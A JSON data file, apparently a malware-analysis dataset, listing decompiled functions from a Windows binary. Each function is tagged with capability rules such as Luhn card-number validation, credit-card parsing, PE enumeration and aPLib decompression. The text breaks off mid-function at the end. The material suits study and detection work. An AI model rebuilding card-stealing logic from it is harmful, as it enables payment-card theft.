{
    "00401100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401100(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401590;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x406010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 216
    },
    "004012c0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401353) overlaps instruction at (ram,0x0040134e)\n// \n// WARNING: Control flow encountered bad instruction data\n\nulong __cdecl fcn.004012c0(uchar *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    char cVar3;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    uint uVar6;\n    uint32_t *in_ECX;\n    uint32_t in_EDX;\n    uint unaff_EBX;\n    uint *puVar7;\n    uint *puVar8;\n    uchar *unaff_ESI;\n    uint8_t *unaff_EDI;\n    uint32_t uVar9;\n    uint16_t in_SS;\n    bool bVar10;\n    uint8_t in_AF;\n    bool bVar11;\n    bool bVar12;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uStack24187;\n    uint16_t uStack24183;\n    uint16_t uStack24181;\n    uchar *puStack88;\n    uchar *puStack44;\n    uint *puStack40;\n    uchar *puStack36;\n    uint uStack24;\n    \n    puStack40 = &stack0xfffffffc;\n    *arg_8h = 0xc6;\n    bVar10 = (POPCOUNT(in_EDX ^ unaff_EBX >> 8 | 0x67) & 1U) == 0;\n    puStack36 = &stack0xfffffff0;\n    arg_8h[1] = 0x97;\n    if ((bVar10) || (!bVar10)) {\n        arg_8h[2] = 0xf2;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        puStack40 = *0xc617b43a;\n        in_EDX = arg_8h & 0xffff0000 | CONCAT11((arg_8h >> 8) + arg_8h, arg_8h);\n    }\n    bVar11 = (in_EDX & 0x1200) != 0;\n    bVar10 = (POPCOUNT(in_EDX >> 8 & 0x12) & 1U) != 0;\n    iVar1 = puStack40[2];\n    *(iVar1 + 3) = 0xea;\n    puVar8 = puStack40;\n    if ((bVar11) && (!bVar11)) {\n        puStack88 = &stack0xffffffec;\n        puVar7 = &stack0xffffffec;\n        puVar8 = &stack0xffffffec;\n        cVar3 = '\\x10';\n        puVar2 = puStack40;\n        do {\n            puVar2 = puVar2 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar2;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n    }\n    *(iVar1 + 4) = 0x99;\n    if ((bVar10) && (!bVar10)) {\n        return CONCAT44(iVar1, in_EDX + 0xf76660b7);\n    }\n    *(iVar1 + 5) = 0xb5;\n    bVar10 = (in_ECX & 0xffff0000 | in_ECX & 0xff | (in_ECX >> 8) - unaff_EBX << 8) < in_EDX;\n    uVar4 = iVar1;\n    iVar1 = puVar8[2];\n    *(iVar1 + 6) = 0x19;\n    if ((!bVar10) && (bVar10)) {\n        cVar3 = uVar4 - *unaff_EDI;\n        uStack24183 = (in_NT & 1) * 0x4000 | SBORROW1(uVar4, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                      (in_TF & 1) * 0x100 | (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                      ((POPCOUNT(cVar3) & 1U) == 0) * 4 | uVar4 < *unaff_EDI;\n        uStack24181 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n        puStack44 = unaff_ESI;\n        func_0x101872fb();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *(iVar1 + 7) = 0x30;\n    bVar12 = uVar4 - 1 == '\\0';\n    bVar11 = (POPCOUNT(uVar4 - 1) & 1U) == 0;\n    *(iVar1 + 8) = 0xd7;\n    if ((bVar11) || (!bVar11)) {\n        *(iVar1 + 9) = 0x11;\n    }\n    else {\n        unaff_ESI = unaff_ESI + 0x43;\n        bVar10 = false;\n        *in_ECX = *in_ECX | in_EDX;\n        bVar12 = *in_ECX == 0;\n    }\n    if ((!bVar10 && !bVar12) && (bVar10 || bVar12)) {\n        uVar4 = uVar4 & 0x58;\n    }\n    *(iVar1 + 10) = 6;\n    *(iVar1 + 0xb) = 0xae;\n    uVar9 = puVar8[2];\n    *(uVar9 + 0xc) = 0xcf;\n    *(uVar9 + 0xd) = 0x10;\n    if ((in_EDX < 'R') || ('Q' < in_EDX)) {\n        *(uVar9 + 0xe) = 0x94;\n    }\n    else {\n        uVar4 = 0x89;\n    }\n    bVar10 = (in_ECX - 5U & 0x44) == 0;\n    *(uVar9 + 0xf) = 0xa0;\n    if ((!bVar10) && (bVar10)) {\n        out(*unaff_ESI, in_EDX);\n        uVar4 = *0x4bb148d3;\n    }\n    *(uVar9 + 0x10) = 0x60;\n    if ((bVar10) || (!bVar10)) {\n        *(uVar9 + 0x11) = 0x62;\n        if (bVar10) goto code_r0x004014a2;\n    }\n    else {\n        uVar9 = in_ECX << 0x10 | in_SS;\n        *(in_EDX + 0x76) = &uStack24183 + *(in_EDX + 0x76);\n        uVar5 = uVar4 | 0x66;\n        uVar4 = uVar4 | 0x66;\n        bVar10 = uVar5 == 0;\n    }\n    if (bVar10) {\n        uVar4 = uVar4 & 0x58;\n    }\ncode_r0x004014a2:\n    *(uVar9 + 0x12) = 0xc5;\n    *(uVar9 + 0x13) = 0xd4;\n    bVar10 = (POPCOUNT(uVar4 - 1) & 1U) != 0;\n    *(uVar9 + 0x14) = 0xb2;\n    if ((bVar10) && (!bVar10)) {\n        puVar7 = &uStack24183;\n        cVar3 = '\\x1e';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar8;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n        uVar6 = in(0x78);\n        return CONCAT44(in_EDX, uVar6);\n    }\n    puVar8 = puVar8[3];\n    *puVar8 = 0x15;\n    return CONCAT44(in_EDX, puVar8);\n}\n",
        "token_count": 1933
    },
    "00401610": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401700": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040176e) overlaps instruction at (ram,0x0040176c)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401700(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    bool bVar3;\n    uint var_4h;\n    \n    arg_ch_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_ch_00 == -1) {\n        return 0;\n    }\n    iVar2 = arg_ch_00;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    bVar3 = iVar1 != 0;\n    if (bVar3) {\n        if (((bVar3) && (!bVar3)) || (*0x41e528 != 0)) {\n            *(unaff_EDI + -0x5f) = *(unaff_EDI + -0x5f) - &stack0xffffffbc;\n            iVar2 = fcn.00401610(iVar2);\n            *0x41e528 = iVar2 == 0;\n        }\n        fcn.00404390(0, arg_ch_00);\n        if (*0x41e528 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 341
    },
    "004017d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401842) overlaps instruction at (ram,0x00401841)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004017d0(void)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint8_t extraout_CH;\n    uint *unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    bool bVar9;\n    bool bVar10;\n    float10 extraout_ST0;\n    unkbyte6 Var11;\n    uint8_t in_stack_330874bc;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    Var11 = fcn.00402950();\n    bVar8 = Var11 == 0;\n    if (bVar8) {\n        fcn.004019a0();\n        return 0;\n    }\n    if ((bVar8) || (!bVar8)) {\n        fcn.00402110();\n    }\n    else {\n        uVar1 = in(Var11 >> 0x20);\n        *unaff_EDI = uVar1;\n        if (&stack0xffffff74 < 1) {\n            uVar2 = *(unaff_EDI + 0x5f);\n            *(unaff_EDI + 0x5f) = CONCAT11(CARRY1(in_stack_330874bc, _pe_dos_header), uVar2) >> 2 | uVar2 << 7;\n            uVar6 = in(0x5d);\n            return uVar6;\n        }\n        piVar3 = extraout_CH ^ 0x10 | 0xdee00000;\n        *piVar3 = extraout_ST0;\n        *piVar3 = *piVar3 + (extraout_CH ^ 0x10);\n    }\n    while( true ) {\n        iVar4 = fcn.00402a60(0x41006c);\n        bVar8 = iVar4 != -1;\n        bVar10 = SBORROW4(iVar4, -1);\n        bVar9 = iVar4 == -1;\n        if (!bVar9) {\n            iVar4 = fcn.00402a60(0x410060);\n            if (iVar4 == -1) {\n                fcn.004019a0();\n            }\n            return 0;\n        }\n        pcVar5 = fcn.00403fc0();\n        if ((bVar8 || bVar9) || (!bVar8 && !bVar9)) break;\n        if (!bVar10) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *pcVar5 = *pcVar5 + pcVar5;\n    }\n    iVar4 = fcn.00404bc0();\n    if (iVar4 != 0) {\n        return 0;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar7 = &var_1fh;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar7 = &var_80h + 1;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar7 = &var_60h + 1;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    puVar7 = &var_40h + 1;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    iVar4 = fcn.00401160(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    iVar4 = fcn.00401e00(&var_20h);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    iVar4 = fcn.00401a90(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar4 != 0;\n}\n",
        "token_count": 1200
    },
    "00402a60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402ac3) overlaps instruction at (ram,0x00402abf)\n// \n// WARNING: Removing unreachable block (ram,0x00402aaf)\n// WARNING: Removing unreachable block (ram,0x00402ab9)\n\nuint __cdecl fcn.00402a60(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x41e52c)(2, 0);\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar3 = &var_12ch;\n    var_8h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar2 = (**0x41e530)(iVar1, &var_130h);\n    do {\n        if (iVar2 == 0) {\ncode_r0x00402b38:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(0xf0, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_128h;\n            iVar1 = var_8h;\n            goto code_r0x00402b38;\n        }\n        iVar2 = (**0x41e534)(iVar1, 0xcc);\n    } while( true );\n}\n",
        "token_count": 456
    },
    "00402f30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040302c) overlaps instruction at (ram,0x0040302b)\n// \n// WARNING: Removing unreachable block (ram,0x00402fbb)\n// WARNING: Removing unreachable block (ram,0x0040301c)\n\nuint fcn.00402f30(uint *param_1)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    char cVar6;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar7;\n    int32_t extraout_ECX;\n    char *pcVar8;\n    uchar *puVar9;\n    uint *puVar10;\n    ushort in_SS;\n    bool bVar11;\n    uint8_t in_AF;\n    ulong uVar12;\n    uint uStack523;\n    int32_t iStack12;\n    uchar uStack5;\n    \n    puVar10 = &uStack523;\n    for (iVar7 = 0x7f; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    iVar7 = fcn.004032f0();\n    if (iVar7 == 0) {\n        return 0;\n    }\n    if (param_1 == 0xffffffff) {\n        uVar3 = fcn.00403250();\n        bVar11 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n        if (uVar3 == 0) {\n            param_1 = 0xd;\n        }\n        else {\n            if ((!bVar11) && (bVar11)) {\n                puVar2 = segment(in_SS, *0x10 + -0x218);\n                if (bVar11) {\n                    return *puVar2;\n                }\n            }\n            param_1 = 0xc;\n        }\n    }\n    uVar12 = (**0x41e544)(0x410268, 1, 0x40, 0, &iStack12, 0);\n    pcVar8 = uVar12 >> 0x20;\n    uVar3 = uVar12;\n    bVar11 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n    if (uVar3 != 0) {\n        return 0;\n    }\n    puVar9 = &stack0xfffffffc;\n    if ((bVar11) && (puVar9 = &stack0xfffffffc,  !bVar11)) {\n        out(*param_1, uVar12 >> 0x20);\n        do {\n            cVar6 = uVar3 >> 8;\n            in_AF = 9 < (uVar3 & 0xf) | in_AF;\n            uVar3 = CONCAT31(CONCAT21(uVar3 >> 0x10, cVar6 - in_AF), -in_AF);\n        } while (in_AF || cVar6 == *pcVar8);\n        piVar1 = puVar10 + pcVar8 * 2 + 3;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX + -0x75) = uVar3;\n        iStack12 = extraout_ECX;\n        puVar9 = &uStack5;\n        param_1 = param_1 + 1;\n    }\n    uVar4 = (**0x41e54c)(*(iStack12 + 0x18));\n    (*_sym.imp.MSVCRT.dll_sprintf)(puVar9 + -0x208, 0x410278, uVar4, param_1);\n    iVar7 = (**0x41e548)(0x41e524, 0, 0, 0, 0);\n    if (iVar7 == 0) {\n        return 0;\n    }\n    *(puVar9 + -4) = 3000;\n    (**0x41e540)(iVar7, 2, puVar9 + -4, 4);\n    iVar5 = (**0x41e53c)(iVar7, puVar9 + -0x208, 0, 0, 0x84000000, 0);\n    if (iVar5 == 0) {\n        (**0x41e550)(iVar7);\n        return 0;\n    }\n    (**0x41e550)(iVar5);\n    (**0x41e550)(iVar7);\n    return 1;\n}\n",
        "token_count": 1022
    },
    "004035e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004035e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 70
    },
    "00404390": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040442c) overlaps instruction at (ram,0x00404428)\n// \n// WARNING: Removing unreachable block (ram,0x0040441f)\n\nuint __cdecl fcn.00404390(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char lpBuffer;\n    uint var_22bh;\n    uint var_128h;\n    uint var_24h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    \n    lpBuffer = '\\0';\n    var_128h._0_1_ = 0;\n    puVar5 = &var_22bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_128h + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar6 = &lpBuffer;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = &var_128h;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar6 = 0x410040;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    puVar5 = &var_128h;\n    do {\n        puVar8 = puVar5;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        puVar8 = puVar5 + 1;\n        cVar1 = *puVar5;\n        puVar5 = puVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = puVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_128h, 0, &var_24h);\n    iVar2 = arg_ch;\n    if ((arg_ch == -1) && (iVar2 = fcn.004021b0(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1167
    },
    "00404860": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004049a1) overlaps instruction at (ram,0x004049a0)\n// \n// WARNING: Removing unreachable block (ram,0x00404993)\n// WARNING: Removing unreachable block (ram,0x0040499d)\n// WARNING: Removing unreachable block (ram,0x004049a1)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl\nfcn.00404860(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uchar *arg_1ch, int32_t arg_20h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    ushort extraout_DX;\n    uchar *noname_1;\n    uint *puVar2;\n    uchar uVar3;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = *0x10 == 0x110;\n    if ((!SBORROW4(&stack0xfffffffc, 0x10c)) && (SBORROW4(&stack0xfffffffc, 0x10c))) {\n        LOCK();\n        uVar3 = in_EAX == -0x658f517f;\n    }\n    fcn.00402b50(arg_18h, arg_1ch, arg_8h, 0x20);\n    fcn.00402b50(arg_18h, arg_1ch, arg_ch, 0x20);\n    noname_1 = arg_1ch;\n    if ((!uVar3) && (uVar3)) {\n        noname_1 = arg_1ch + 1;\n        out(*arg_1ch, extraout_DX);\n    }\n    fcn.00402b50(arg_18h, noname_1, arg_10h, 0x20);\n    fcn.00402b50(arg_18h, noname_1, arg_14h, 0x20);\n    iVar1 = fcn.00404810();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00403120(0x80000001, 0x410294, 0x4102c0, &var_8h, &var_10ch, &var_4h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(*0x10 + -0x110, 0x10),  iVar1 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 770
    },
    "00404bc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00404bc0(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004021b0(0x410008);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*((&stack0xfffffffc & 0xffff0000 | *0x10 - 4) - 4));\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 103
    },
    "00401e00": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401eb6) overlaps instruction at (ram,0x00401eb3)\n// \n// WARNING: Removing unreachable block (ram,0x00401e3f)\n// WARNING: Removing unreachable block (ram,0x00401e48)\n// WARNING: Removing unreachable block (ram,0x00401e4c)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401e00(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &s + 1;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x1c, *0x10 + -0x214, arg_8h);\n    bVar3 = false;\n    arg_8h_00 = fcn.004047a0(&var_4h, &var_8h);\n    if ((bVar3) || (!bVar3)) {\n        arg_8h_00 = var_4h;\n    }\n    fcn.00401f30(arg_8h_00);\n    iVar1 = fcn.00402450(&s, 0x41003c, var_4h, var_8h);\n    if (iVar1 != 0) {\n        fcn.00404390(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 557
    },
    "00402500": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040254a) overlaps instruction at (ram,0x00402548)\n// \n\nint32_t __cdecl fcn.00402500(uint32_t arg_8h, uint16_t *arg_ch, uint arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint in_EAX;\n    uint16_t *puVar3;\n    char in_DL;\n    int32_t unaff_EBX;\n    uint16_t *unaff_ESI;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    bool bVar6;\n    bool bVar7;\n    \n    bVar6 = SBORROW1(in_DL + '\\x15', in_EAX >> 8);\n    if ((bVar6) || (!bVar6)) {\n        in_EAX = arg_10h;\n        unaff_ESI = arg_ch;\n    }\n    puVar3 = CONCAT31(in_EAX >> 8, 0x98);\n    puVar1 = unaff_EBX + -0x3f7af38b;\n    uVar2 = *puVar1;\n    bVar7 = SCARRY1(*puVar1, '!') != SCARRY1(*puVar1 + 0x21, '\\0');\n    *puVar1 = *puVar1 + 0x21;\n    bVar6 = *puVar1 < '\\0';\n    puVar5 = puVar3;\n    if (uVar2 < 0xdf && *puVar1 != 0) {\n        do {\n            if ((bVar7 != bVar6) || (bVar7 == bVar6)) {\n                puVar3 = *unaff_ESI;\n            }\n            *(puVar3 + -0x75) = *(puVar3 + -0x75) << 6;\n            arg_8h = arg_8h + unaff_ESI;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            puVar4 = puVar3 + 1;\n            bVar7 = SBORROW4(puVar5, 1);\n            puVar5 = puVar5 + -1;\n            bVar6 = puVar5 < 0;\n            puVar3 = unaff_ESI;\n            unaff_ESI = puVar4;\n        } while (puVar5 != NULL);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 579
    },
    "00401f30": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004020a6) overlaps instruction at (ram,0x004020a5)\n// \n// WARNING: Removing unreachable block (ram,0x004020a6)\n// WARNING: Removing unreachable block (ram,0x00401fe2)\n// WARNING: Removing unreachable block (ram,0x00401fea)\n// WARNING: Removing unreachable block (ram,0x00401fed)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint64_t __cdecl fcn.00401f30(int16_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint extraout_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    ushort in_SS;\n    bool bVar9;\n    uint64_t uVar10;\n    uint var_4h;\n    \n    if (*arg_8h != 0x5a4d) {\n        return in_EDX << 0x20;\n    }\n    if (*(*(arg_8h + 0x1e) + arg_8h) != 0x4550) {\n        return in_EDX << 0x20;\n    }\n    if ((*(arg_8h + 0x1e) + 